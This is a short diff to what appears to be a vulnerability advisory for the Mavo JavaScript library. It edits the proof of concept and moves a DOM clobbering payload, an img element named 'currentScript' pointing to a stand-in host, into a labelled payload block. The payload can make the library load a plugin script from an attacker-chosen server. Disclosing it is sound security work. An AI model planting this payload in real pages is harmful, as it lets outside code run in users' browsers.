@@ -36,11 +36,9 @@ if (o.dependencies) {
 ## PoC
 
 ```html
-<image name=currentScript src="http://localhost:8000"></img>
-
+<!--Library-->
 <script src="https://get.mavo.io/stable/mavo.js"></script>
 <link rel="stylesheet" href="https://get.mavo.io/stable/mavo.css">
-
 <script>
 (function ($, $$) {
 
@@ -50,4 +48,9 @@ Mavo.Plugins.register("myplugin", {
 
 })(Bliss, Bliss.$);
 </script>
+<!--Library-->
+
+<!--Payload-->
+<img name=currentScript src="http://localhost:9999"></img>
+<!--Payload-->
 ```
